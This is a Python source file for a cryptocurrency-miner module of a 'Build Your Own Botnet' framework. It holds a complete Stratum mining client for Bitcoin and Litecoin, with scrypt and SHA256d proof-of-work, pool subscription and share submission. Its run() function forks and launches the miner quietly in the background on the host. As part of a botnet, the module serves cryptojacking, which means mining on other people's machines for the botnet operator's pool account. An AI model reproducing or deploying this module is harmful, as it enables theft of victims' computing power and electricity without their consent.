#!/usr/bin/python
"Cryptocurrency Miner (Build Your Own Botnet)"

# standard library
import os
import sys
import time
import json
import hmac
import socket
import struct
import hashlib
import binascii
import threading

if sys.version_info[0] == 3:
  import urllib.parse as urlparse # Python 3
else:
  from urllib2 import urlparse  # Python 2

try:
    xrange      # Python 2
except NameError:
    xrange = range  # Python 3

# byob utilities
import util

# globals
command = True
results = {}
packages  = []
platforms = ['linux2','darwin']
usage = 'miner <url> <username> <password>'
description = """
Run a cryptocurrency miner in the background (supports Bitcoin & Litecoin)
"""

USER_AGENT = "BYOB"
VERSION = [0, 1]


# Which algorithm for proof-of-work to use
ALGORITHM_SCRYPT      = 'scrypt'
ALGORITHM_SHA256D     = 'sha256d'

ALGORITHMS = [ ALGORITHM_SCRYPT, ALGORITHM_SHA256D ]


# Verbosity and log level
QUIET           = False
DEBUG           = False
DEBUG_PROTOCOL  = False

LEVEL_PROTOCOL  = 'protocol'
LEVEL_INFO      = 'info'
LEVEL_DEBUG     = 'debug'
LEVEL_ERROR     = 'error'


# These control which scrypt implementation to use
SCRYPT_LIBRARY_AUTO     = 'auto'
SCRYPT_LIBRARY_LTC      = 'ltc_scrypt (https://github.com/forrestv/p2pool)'
SCRYPT_LIBRARY_SCRYPT   = 'scrypt (https://pypi.python.org/pypi/scrypt/)'
SCRYPT_LIBRARY_PYTHON   = 'pure python'
SCRYPT_LIBRARIES = [ SCRYPT_LIBRARY_AUTO, SCRYPT_LIBRARY_LTC, SCRYPT_LIBRARY_SCRYPT, SCRYPT_LIBRARY_PYTHON ]


def log(message, level):
  '''Conditionally write a message to stdout based on command line options and level.'''

  global DEBUG
  global DEBUG_PROTOCOL
  global QUIET

  if QUIET and level != LEVEL_ERROR: return
  if not DEBUG_PROTOCOL and level == LEVEL_PROTOCOL: return
  if not DEBUG and level == LEVEL_DEBUG: return

  if level != LEVEL_PROTOCOL: message = '[%s] %s' % (level.upper(), message)

  print ("[%s] %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), message))


# Convert from/to binary and hexidecimal strings (could be replaced with .encode('hex') and .decode('hex'))
hexlify = binascii.hexlify
unhexlify = binascii.unhexlify


def sha256d(message):
  '''Double SHA256 Hashing function.'''

  return hashlib.sha256(hashlib.sha256(message).digest()).digest()


def swap_endian_word(hex_word):
  '''Swaps the endianness of a hexidecimal string of a word and converts to a binary string.'''

  message = unhexlify(hex_word)
  if len(message) != 4: raise ValueError('Must be 4-byte word')
  return message[::-1]


def swap_endian_words(hex_words):
  '''Swaps the endianness of a hexidecimal string of words and converts to binary string.'''

  message = unhexlify(hex_words)
  if len(message) % 4 != 0: raise ValueError('Must be 4-byte word aligned')
  return ''.join([ message[4 * i: 4 * i + 4][::-1] for i in range(0, len(message) // 4) ])


def human_readable_hashrate(hashrate):
  '''Returns a human readable representation of hashrate.'''

  if hashrate < 1000:
    return '%2f hashes/s' % hashrate
  if hashrate < 10000000:
    return '%2f khashes/s' % (hashrate / 1000)
  if hashrate < 10000000000:
    return '%2f Mhashes/s' % (hashrate / 1000000)
  return '%2f Ghashes/s' % (hashrate / 1000000000)


def scrypt(password, salt, N, r, p, dkLen):
  """Returns the result of the scrypt password-based key derivation function.

     This is used as the foundation of the proof-of-work for litecoin and other
     scrypt-based coins, using the parameters:
       password = bloack_header
       salt     = block_header
       N        = 1024
       r        = 1
       p        = 1
       dkLen    = 256 bits (=32 bytes)

   """

  def array_overwrite(source, source_start, dest, dest_start, length):
    '''Overwrites the dest array with the source array.'''

    for i in xrange(0, length):
      dest[dest_start + i] = source[source_start + i]


  def blockxor(source, source_start, dest, dest_start, length):
    '''Performs xor on arrays source and dest, storing the result back in dest.'''

    for i in xrange(0, length):
      dest[dest_start + i] = chr(ord(dest[dest_start + i]) ^ ord(source[source_start + i]))


  def pbkdf2(passphrase, salt, count, dkLen, prf):
    '''Returns the result of the Password-Based Key Derivation Function 2.

       See http://en.wikipedia.org/wiki/PBKDF2
    '''

    def f(block_number):
      '''The function "f".'''

      U = prf(passphrase, salt + struct.pack('>L', block_number))

      # Not used for scrpyt-based coins, could be removed, but part of a more general solution
      if count > 1:
        U = [ c for c in U ]
        for i in xrange(2, 1 + count):
          blockxor(prf(passphrase, ''.join(U)), 0, U, 0, len(U))
        U = ''.join(U)

      return U

    # PBKDF2 implementation
    size = 0

    block_number = 0
    blocks = [ ]

    # The iterations
    while size < dkLen:
      block_number += 1
      block = f(block_number)

      blocks.append(block)
      size += len(block)

    return ''.join(blocks)[:dkLen]

  def integerify(B, Bi, r):
    '''"A bijective function from ({0, 1} ** k) to {0, ..., (2 ** k) - 1".'''

    Bi += (2 * r - 1) * 64
    n  = ord(B[Bi]) | (ord(B[Bi + 1]) << 8) | (ord(B[Bi + 2]) << 16) | (ord(B[Bi + 3]) << 24)
    return n


  def make_int32(v):
    '''Converts (truncates, two's compliments) a number to an int32.'''

    if v > 0x7fffffff: return -1 * ((~v & 0xffffffff) + 1)
    return v


  def R(X, destination, a1, a2, b):
    '''A single round of Salsa.'''

    a = (X[a1] + X[a2]) & 0xffffffff
    X[destination] ^= ((a << b) | (a >> (32 - b)))


  def salsa20_8(B):
    '''Salsa 20/8 stream cypher; Used by BlockMix. See http://en.wikipedia.org/wiki/Salsa20'''

    # Convert the character array into an int32 array
    B32 = [ make_int32((ord(B[i * 4]) | (ord(B[i * 4 + 1]) << 8) | (ord(B[i * 4 + 2]) << 16) | (ord(B[i * 4 + 3]) << 24))) for i in xrange(0, 16) ]
    x = [ i for i in B32 ]

    # Salsa... Time to dance.
    for i in xrange(8, 0, -2):
      R(x, 4, 0, 12, 7);   R(x, 8, 4, 0, 9);    R(x, 12, 8, 4, 13);   R(x, 0, 12, 8, 18)
      R(x, 9, 5, 1, 7);    R(x, 13, 9, 5, 9);   R(x, 1, 13, 9, 13);   R(x, 5, 1, 13, 18)
      R(x, 14, 10, 6, 7);  R(x, 2, 14, 10, 9);  R(x, 6, 2, 14, 13);   R(x, 10, 6, 2, 18)
      R(x, 3, 15, 11, 7);  R(x, 7, 3, 15, 9);   R(x, 11, 7, 3, 13);   R(x, 15, 11, 7, 18)
      R(x, 1, 0, 3, 7);    R(x, 2, 1, 0, 9);    R(x, 3, 2, 1, 13);    R(x, 0, 3, 2, 18)
      R(x, 6, 5, 4, 7);    R(x, 7, 6, 5, 9);    R(x, 4, 7, 6, 13);    R(x, 5, 4, 7, 18)
      R(x, 11, 10, 9, 7);  R(x, 8, 11, 10, 9);  R(x, 9, 8, 11, 13);   R(x, 10, 9, 8, 18)
      R(x, 12, 15, 14, 7); R(x, 13, 12, 15, 9); R(x, 14, 13, 12, 13); R(x, 15, 14, 13, 18)

    # Coerce into nice happy 32-bit integers
    B32 = [ make_int32(x[i] + B32[i]) for i in xrange(0, 16) ]

    # Convert back to bytes
    for i in xrange(0, 16):
      B[i * 4 + 0] = chr((B32[i] >> 0) & 0xff)
      B[i * 4 + 1] = chr((B32[i] >> 8) & 0xff)
      B[i * 4 + 2] = chr((B32[i] >> 16) & 0xff)
      B[i * 4 + 3] = chr((B32[i] >> 24) & 0xff)


  def blockmix_salsa8(BY, Bi, Yi, r):
    '''Blockmix; Used by SMix.'''

    start = Bi + (2 * r - 1) * 64
    X = [ BY[i] for i in xrange(start, start + 64) ]                   # BlockMix - 1

    for i in xrange(0, 2 * r):                                         # BlockMix - 2
      blockxor(BY, i * 64, X, 0, 64)                                   # BlockMix - 3(inner)
      salsa20_8(X)                                                     # BlockMix - 3(outer)
      array_overwrite(X, 0, BY, Yi + (i * 64), 64)                     # BlockMix - 4

    for i in xrange(0, r):                                             # BlockMix - 6 (and below)
      array_overwrite(BY, Yi + (i * 2) * 64, BY, Bi + (i * 64), 64)

    for i in xrange(0, r):
      array_overwrite(BY, Yi + (i * 2 + 1) * 64, BY, Bi + (i + r) * 64, 64)


  def smix(B, Bi, r, N, V, X):
    '''SMix; a specific case of ROMix. See scrypt.pdf in the links above.'''

    array_overwrite(B, Bi, X, 0, 128 * r)               # ROMix - 1

    for i in xrange(0, N):                              # ROMix - 2
      array_overwrite(X, 0, V, i * (128 * r), 128 * r)  # ROMix - 3
      blockmix_salsa8(X, 0, 128 * r, r)                 # ROMix - 4

    for i in xrange(0, N):                              # ROMix - 6
      j = integerify(X, 0, r) & (N - 1)                 # ROMix - 7
      blockxor(V, j * (128 * r), X, 0, 128 * r)         # ROMix - 8(inner)
      blockmix_salsa8(X, 0, 128 * r, r)                 # ROMix - 9(outer)

    array_overwrite(X, 0, B, Bi, 128 * r)               # ROMix - 10


  # Scrypt implementation. Significant thanks to https://github.com/wg/scrypt
  if N < 2 or (N & (N - 1)): raise ValueError('Scrypt N must be a power of 2 greater than 1')

  prf = lambda k, m: hmac.new(key = k, msg = m, digestmod = hashlib.sha256).digest()

  DK = [ chr(0) ] * dkLen

  B  = [ c for c in pbkdf2(password, salt, 1, p * 128 * r, prf) ]
  XY = [ chr(0) ] * (256 * r)
  V  = [ chr(0) ] * (128 * r * N)

  for i in xrange(0, p):
    smix(B, i * 128 * r, r, N, V, XY)

  return pbkdf2(password, ''.join(B), 1, dkLen, prf)


SCRYPT_LIBRARY = None
scrypt_proof_of_work = None
def set_scrypt_library(library = SCRYPT_LIBRARY_AUTO):
  '''Sets the scrypt library implementation to use.'''

  global SCRYPT_LIBRARY
  global scrypt_proof_of_work

  if library == SCRYPT_LIBRARY_LTC:
    import ltc_scrypt
    scrypt_proof_of_work = ltc_scrypt.getPoWHash
    SCRYPT_LIBRARY = library

  elif library == SCRYPT_LIBRARY_SCRYPT:
    import scrypt as NativeScrypt
    scrypt_proof_of_work = lambda header: NativeScrypt.hash(header, header, 1024, 1, 1, 32)
    SCRYPT_LIBRARY = library

  # Try to load a faster version of scrypt before using the pure-Python implementation
  elif library == SCRYPT_LIBRARY_AUTO:
    try:
      set_scrypt_library(SCRYPT_LIBRARY_LTC)
    except Exception as e:
      try:
        set_scrypt_library(SCRYPT_LIBRARY_SCRYPT)
      except Exception as e:
        set_scrypt_library(SCRYPT_LIBRARY_PYTHON)

  else:
    scrypt_proof_of_work = lambda header: scrypt(header, header, 1024, 1, 1, 32)
    SCRYPT_LIBRARY = library

set_scrypt_library()


class Job(object):
  '''Encapsulates a Job from the network and necessary helper methods to mine.

     "If you have a procedure with 10 parameters, you probably missed some."
           ~Alan Perlis
  '''

  def __init__(self, job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime, target, extranounce1, extranounce2_size, proof_of_work):

    # Job parts from the mining.notify command
    self._job_id = job_id
    self._prevhash = prevhash
    self._coinb1 = coinb1
    self._coinb2 = coinb2
    self._merkle_branches = [ b for b in merkle_branches ]
    self._version = version
    self._nbits = nbits
    self._ntime = ntime

    # Job information needed to mine from mining.subsribe
    self._target = target
    self._extranounce1 = extranounce1
    self._extranounce2_size = extranounce2_size

    # Proof of work algorithm
    self._proof_of_work = proof_of_work

    # Flag to stop this job's mine coroutine
    self._done = False

    # Hash metrics (start time, delta time, total hashes)
    self._dt = 0.0
    self._hash_count = 0

  # Accessors
  id = property(lambda s: s._job_id)
  prevhash = property(lambda s: s._prevhash)
  coinb1 = property(lambda s: s._coinb1)
  coinb2 = property(lambda s: s._coinb2)
  merkle_branches = property(lambda s: [ b for b in s._merkle_branches ])
  version = property(lambda s: s._version)
  nbits = property(lambda s: s._nbits)
  ntime = property(lambda s: s._ntime)

  target = property(lambda s: s._target)
  extranounce1 = property(lambda s: s._extranounce1)
  extranounce2_size = property(lambda s: s._extranounce2_size)

  proof_of_work = property(lambda s: s._proof_of_work)


  @property
  def hashrate(self):
    '''The current hashrate, or if stopped hashrate for the job's lifetime.'''

    if self._dt == 0: return 0.0
    return self._hash_count / self._dt


  def merkle_root_bin(self, extranounce2_bin):
    '''Builds a merkle root from the merkle tree'''

    coinbase_bin = unhexlify(self._coinb1) + unhexlify(self._extranounce1) + extranounce2_bin + unhexlify(self._coinb2)
    coinbase_hash_bin = sha256d(coinbase_bin)

    merkle_root = coinbase_hash_bin
    for branch in self._merkle_branches:
      merkle_root = sha256d(merkle_root + unhexlify(branch))
    return merkle_root


  def stop(self):
    '''Requests the mine coroutine stop after its current iteration.'''

    self._done = True


  def mine(self, nounce_start = 0, nounce_stride = 1):
    '''Returns an iterator that iterates over valid proof-of-work shares.

       This is a co-routine; that takes a LONG time; the calling thread should look like:

         for result in job.mine(self):
           submit_work(result)

       nounce_start and nounce_stride are useful for multi-processing if you would like
       to assign each process a different starting nounce (0, 1, 2, ...) and a stride
       equal to the number of processes.
    '''

    t0 = time.time()

    # @TODO: test for extranounce != 0... Do I reverse it or not?
    for extranounce2 in xrange(0, 0x7fffffff):

      # Must be unique for any given job id, according to http://mining.bitcoin.cz/stratum-mining/ but never seems enforced?
      extranounce2_bin = struct.pack('<I', extranounce2)

      merkle_root_bin = self.merkle_root_bin(extranounce2_bin)
      header_prefix_bin = swap_endian_word(self._version) + swap_endian_words(self._prevhash) + merkle_root_bin + swap_endian_word(self._ntime) + swap_endian_word(self._nbits)
      for nounce in xrange(nounce_start, 0x7fffffff, nounce_stride):
        # This job has been asked to stop
        if self._done:
          self._dt += (time.time() - t0)
          raise StopIteration()

        # Proof-of-work attempt
        nounce_bin = struct.pack('<I', nounce)
        pow = self.proof_of_work(header_prefix_bin + nounce_bin)[::-1].encode('hex')

        # Did we reach or exceed our target?
        if pow <= self.target:
          result = dict(
            job_id = self.id,
            extranounce2 = hexlify(extranounce2_bin),
            ntime = str(self._ntime),                    # Convert to str from json unicode
            nounce = hexlify(nounce_bin[::-1])
          )
          self._dt += (time.time() - t0)

          yield result

          t0 = time.time()

        self._hash_count += 1


  def __str__(self):
    return '<Job id=%s prevhash=%s coinb1=%s coinb2=%s merkle_branches=%s version=%s nbits=%s ntime=%s target=%s extranounce1=%s extranounce2_size=%d>' % (self.id, self.prevhash, self.coinb1, self.coinb2, self.merkle_branches, self.version, self.nbits, self.ntime, self.target, self.extranounce1, self.extranounce2_size)


# Subscription state
class Subscription(object):
  '''Encapsulates the Subscription state from the JSON-RPC server'''

  # Subclasses should override this
  def ProofOfWork(header):
    raise Exception('Do not use the Subscription class directly, subclass it')

  class StateException(Exception): pass

  def __init__(self):
    self._id = None
    self._difficulty = None
    self._extranounce1 = None
    self._extranounce2_size = None
    self._target = None
    self._worker_name = None

    self._mining_thread = None

  # Accessors
  id = property(lambda s: s._id)
  worker_name = property(lambda s: s._worker_name)

  difficulty = property(lambda s: s._difficulty)
  target = property(lambda s: s._target)

  extranounce1 = property(lambda s: s._extranounce1)
  extranounce2_size = property(lambda s: s._extranounce2_size)


  def set_worker_name(self, worker_name):
    if self._worker_name:
      raise self.StateException('Already authenticated as {}'.format(self._username))

    self._worker_name = worker_name


  def _set_target(self, target):
    self._target = '%064x' % target


  def set_difficulty(self, difficulty):
    if difficulty < 0: raise self.StateException('Difficulty must be non-negative')

    # Compute target
    if difficulty == 0:
      target = 2 ** 256 - 1
    else:
      target = min(int((0xffff0000 * 2 ** (256 - 64) + 1) / difficulty - 1 + 0.5), 2 ** 256 - 1)

    self._difficulty = difficulty
    self._set_target(target)


  def set_subscription(self, subscription_id, extranounce1, extranounce2_size):
    if self._id is not None:
      raise self.StateException('Already subscribed')

    self._id = subscription_id
    self._extranounce1 = extranounce1
    self._extranounce2_size = extranounce2_size


  def create_job(self, job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime):
    '''Creates a new Job object populated with all the goodness it needs to mine.'''

    if self._id is None:
      raise self.StateException('Not subscribed')

    return Job(
      job_id = job_id,
      prevhash = prevhash,
      coinb1 = coinb1,
      coinb2 = coinb2,
      merkle_branches = merkle_branches,
      version = version,
      nbits = nbits,
      ntime = ntime,
      target = self.target,
      extranounce1 = self._extranounce1,
      extranounce2_size = self.extranounce2_size,
      proof_of_work = self.ProofOfWork
    )


  def __str__(self):
    return '<Subscription id=%s, extranounce1=%s, extranounce2_size=%d, difficulty=%d worker_name=%s>' % (self.id, self.extranounce1, self.extranounce2_size, self.difficulty, self.worker_name)


class SubscriptionScrypt(Subscription):
  '''Subscription for Scrypt-based coins, like Litecoin.'''

  ProofOfWork = lambda s, h: (scrypt_proof_of_work(h))

  def _set_target(self, target):
    # Why multiply by 2**16? See: https://litecoin.info/Mining_pool_comparison
    self._target = '%064x' % (target << 16)


class SubscriptionSHA256D(Subscription):
  '''Subscription for Double-SHA256-based coins, like Bitcoin.'''

  ProofOfWork = sha256d


# Maps algorithms to their respective subscription objects
SubscriptionByAlgorithm = { ALGORITHM_SCRYPT: SubscriptionScrypt, ALGORITHM_SHA256D: SubscriptionSHA256D }


class SimpleJsonRpcClient(object):
  '''Simple JSON-RPC client.

    To use this class:
      1) Create a sub-class
      2) Override handle_reply(self, request, reply)
      3) Call connect(socket)

    Use self.send(method, params) to send JSON-RPC commands to the server.

    A new thread is created for listening to the connection; so calls to handle_reply
    are synchronized. It is safe to call send from withing handle_reply.
  '''

  class ClientException(Exception): pass

  class RequestReplyException(Exception):
    def __init__(self, message, reply, request = None):
      Exception.__init__(self, message)
      self._reply = reply
      self._request = request

    request = property(lambda s: s._request)
    reply = property(lambda s: s._reply)

  class RequestReplyWarning(RequestReplyException):
    '''Sub-classes can raise this to inform the user of JSON-RPC server issues.'''
    pass

  def __init__(self):
    self._socket = None
    self._lock = threading.RLock()
    self._rpc_thread = None
    self._message_id = 1
    self._requests = dict()


  def _handle_incoming_rpc(self):
    data = ""
    while True:
      # Get the next line if we have one, otherwise, read and block
      if '\n' in data:
        (line, data) = data.split('\n', 1)
      else:
        chunk = self._socket.recv(1024)
        data += chunk
        continue

      log('JSON-RPC Server > ' + line, LEVEL_PROTOCOL)

      # Parse the JSON
      try:
        reply = json.loads(line)
      except Exception as e:
        log("JSON-RPC Error: Failed to parse JSON %r (skipping)" % line, LEVEL_ERROR)
        continue

      try:
        request = None
        with self._lock:
          if 'id' in reply and reply['id'] in self._requests:
            request = self._requests[reply['id']]
          self.handle_reply(request = request, reply = reply)
      except self.RequestReplyWarning as e:
        output = e.message
        if e.request:
          output += '\n  ' + e.request
        output += '\n  ' + e.reply
        log(output, LEVEL_ERROR)


  def handle_reply(self, request, reply):
    # Override this method in sub-classes to handle a message from the server
    raise self.RequestReplyWarning('Override this method')


  def send(self, method, params):
    '''Sends a message to the JSON-RPC server'''

    if not self._socket:
      raise self.ClientException('Not connected')

    request = dict(id = self._message_id, method = method, params = params)
    message = json.dumps(request)
    with self._lock:
      self._requests[self._message_id] = request
      self._message_id += 1
      self._socket.send(message + '\n')

    log('JSON-RPC Server < ' + message, LEVEL_PROTOCOL)

    return request


  def connect(self, socket):
    '''Connects to a remove JSON-RPC server'''

    if self._rpc_thread:
      raise self.ClientException('Already connected')

    self._socket = socket

    self._rpc_thread = threading.Thread(target = self._handle_incoming_rpc)
    self._rpc_thread.daemon = True
    self._rpc_thread.start()


# Miner client
class Miner(SimpleJsonRpcClient):
  '''Simple mining client'''

  class MinerWarning(SimpleJsonRpcClient.RequestReplyWarning):
    def __init__(self, message, reply, request = None):
      SimpleJsonRpcClient.RequestReplyWarning.__init__(self, 'Mining Sate Error: ' + message, reply, request)

  class MinerAuthenticationException(SimpleJsonRpcClient.RequestReplyException): pass

  def __init__(self, url, username, password, algorithm = ALGORITHM_SCRYPT):
    SimpleJsonRpcClient.__init__(self)

    self._url = url
    self._username = username
    self._password = password

    self._subscription = SubscriptionByAlgorithm[algorithm]()

    self._job = None

    self._accepted_shares = 0

  # Accessors
  url = property(lambda s: s._url)
  username = property(lambda s: s._username)
  password = property(lambda s: s._password)


  # Overridden from SimpleJsonRpcClient
  def handle_reply(self, request, reply):

    # New work, stop what we were doing before, and start on this.
    if reply.get('method') == 'mining.notify':
      if 'params' not in reply or len(reply['params']) != 9:
        raise self.MinerWarning('Malformed mining.notify message', reply)

      (job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime, clean_jobs) = reply['params']
      self._spawn_job_thread(job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime)

      log('New job: job_id=%s' % job_id, LEVEL_DEBUG)

    # The server wants us to change our difficulty (on all *future* work)
    elif reply.get('method') == 'mining.set_difficulty':
      if 'params' not in reply or len(reply['params']) != 1:
        raise self.MinerWarning('Malformed mining.set_difficulty message', reply)

      (difficulty, ) = reply['params']
      self._subscription.set_difficulty(difficulty)

      log('Change difficulty: difficulty=%s' % difficulty, LEVEL_DEBUG)

    # This is a reply to...
    elif request:

      # ...subscribe; set-up the work and request authorization
      if request.get('method') == 'mining.subscribe':
        if 'result' not in reply or len(reply['result']) != 3 or len(reply['result'][0]) != 2:
          raise self.MinerWarning('Reply to mining.subscribe is malformed', reply, request)

        ((mining_notify, subscription_id), extranounce1, extranounce2_size) = reply['result']

        self._subscription.set_subscription(subscription_id, extranounce1, extranounce2_size)

        log('Subscribed: subscription_id=%s' % subscription_id, LEVEL_DEBUG)

        # Request authentication
        self.send(method = 'mining.authorize', params = [ self.username, self.password ])

      # ...authorize; if we failed to authorize, quit
      elif request.get('method') == 'mining.authorize':
        if 'result' not in reply or not reply['result']:
          raise self.MinerAuthenticationException('Failed to authenticate worker', reply, request)

        worker_name = request['params'][0]
        self._subscription.set_worker_name(worker_name)

        log('Authorized: worker_name=%s' % worker_name, LEVEL_DEBUG)

      # ...submit; complain if the server didn't accept our submission
      elif request.get('method') == 'mining.submit':
        if 'result' not in reply or not reply['result']:
          log('Share - Invalid', LEVEL_INFO)
          raise self.MinerWarning('Failed to accept submit', reply, request)

        self._accepted_shares += 1
        log('Accepted shares: %d' % self._accepted_shares, LEVEL_INFO)

      # ??? *shrug*
      else:
        raise self.MinerWarning('Unhandled message', reply, request)

    # ??? *double shrug*
    else:
      raise self.MinerWarning('Bad message state', reply)


  def _spawn_job_thread(self, job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime):
    '''Stops any previous job and begins a new job.'''

    # Stop the old job (if any)
    if self._job: self._job.stop()

    # Create the new job
    self._job = self._subscription.create_job(
      job_id = job_id,
      prevhash = prevhash,
      coinb1 = coinb1,
      coinb2 = coinb2,
      merkle_branches = merkle_branches,
      version = version,
      nbits = nbits,
      ntime = ntime
    )

    def run(job):
      try:
        for result in job.mine():
          params = [ self._subscription.worker_name ] + [ result[k] for k in ('job_id', 'extranounce2', 'ntime', 'nounce') ]
          self.send(method = 'mining.submit', params = params)
          log("Found share: " + str(params), LEVEL_INFO)
        log("Hashrate: %s" % human_readable_hashrate(job.hashrate), LEVEL_INFO)
      except Exception as e:
        log("ERROR: %s" % e, LEVEL_ERROR)

    thread = threading.Thread(target = run, args = (self._job, ))
    thread.daemon = True
    thread.start()


  def serve_forever(self):
    '''Begins the miner. This method does not return.'''

    # Figure out the hostname and port
    url = urlparse.urlparse(self.url)
    hostname = url.hostname or ''
    port = url.port or 9333

    log('Starting server on %s:%d' % (hostname, port), LEVEL_INFO)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostname, port))
    self.connect(sock)

    self.send(method = 'mining.subscribe', params = [ "%s/%s" % (USER_AGENT, '.'.join(str(p) for p in VERSION)) ])

    # Forever...
    while True:
      time.sleep(10)


def test_subscription():
  '''Test harness for mining, using a known valid share.'''

  log('TEST: Scrypt algorithm = %r' % SCRYPT_LIBRARY, LEVEL_DEBUG)
  log('TEST: Testing Subscription', LEVEL_DEBUG)

  subscription = SubscriptionScrypt()

  # Set up the subscription
  reply = json.loads('{"error": null, "id": 1, "result": [["mining.notify", "ae6812eb4cd7735a302a8a9dd95cf71f"], "f800880e", 4]}')
  log('TEST: %r' % reply, LEVEL_DEBUG)
  ((mining_notify, subscription_id), extranounce1, extranounce2_size) = reply['result']
  subscription.set_subscription(subscription_id, extranounce1, extranounce2_size)

  # Set the difficulty
  reply = json.loads('{"params": [32], "id": null, "method": "mining.set_difficulty"}')
  log('TEST: %r' % reply, LEVEL_DEBUG)
  (difficulty, ) = reply['params']
  subscription.set_difficulty(difficulty)

  # Create a job
  reply = json.loads('{"params": ["1db7", "0b29bfff96c5dc08ee65e63d7b7bab431745b089ff0cf95b49a1631e1d2f9f31", "01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff2503777d07062f503253482f0405b8c75208", "0b2f436f696e48756e74722f0000000001603f352a010000001976a914c633315d376c20a973a758f7422d67f7bfed9c5888ac00000000", ["f0dbca1ee1a9f6388d07d97c1ab0de0e41acdf2edac4b95780ba0a1ec14103b3", "8e43fd2988ac40c5d97702b7e5ccdf5b06d58f0e0d323f74dd5082232c1aedf7", "1177601320ac928b8c145d771dae78a3901a089fa4aca8def01cbff747355818", "9f64f3b0d9edddb14be6f71c3ac2e80455916e207ffc003316c6a515452aa7b4", "2d0b54af60fad4ae59ec02031f661d026f2bb95e2eeb1e6657a35036c017c595"], "00000002", "1b148272", "52c7b81a", true], "id": null, "method": "mining.notify"}')
  log('TEST: %r' % reply, LEVEL_DEBUG)
  (job_id, prevhash, coinb1, coinb2, merkle_branches, version, nbits, ntime, clean_jobs) = reply['params']
  job = subscription.create_job(
    job_id = job_id,
    prevhash = prevhash,
    coinb1 = coinb1,
    coinb2 = coinb2,
    merkle_branches = merkle_branches,
    version = version,
    nbits = nbits,
    ntime = ntime
  )

  # Scan that job
  for result in job.mine(nounce_start = 1210450368 - 3):
    log('TEST: found share - %r' % repr(result), LEVEL_DEBUG)
    break

  valid = { 'ntime': '52c7b81a', 'nounce': '482601c0', 'extranounce2': '00000000', 'job_id': u'1db7' }
  log('TEST: Correct answer %r' % valid, LEVEL_DEBUG)


def run(url, username, password):
  """
  Run the crytocurrency miner in the background

  `Required`
  :param str url:     stratum mining server url
  :param str username:  username for mining server
  :param str password:  password for mining server

  """
  global ALGORITHM_SHA256D
  pid = os.fork()
  if pid:
    miner = Miner(url, username, password, ALGORITHM_SHA256D)
    t = threading.Thread(target=miner.serve_forever)
    t.daemon = True
    t.start()
    return pid
  else:
    sys.exit(0)
